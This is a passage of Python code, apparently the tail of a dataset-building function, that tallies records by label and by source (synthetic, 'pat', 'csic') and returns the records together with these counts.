        **{f"label_{k}": sum(1 for r in final if r["label"] == k) for k in LABELS},
        "source_synthetic": sum(1 for r in final if r["source"].startswith("synthetic")),
        "source_pat": sum(1 for r in final if r["source"] == "pat"),
        "source_csic": sum(1 for r in final if r["source"].startswith("csic")),
    }
    return final, stats
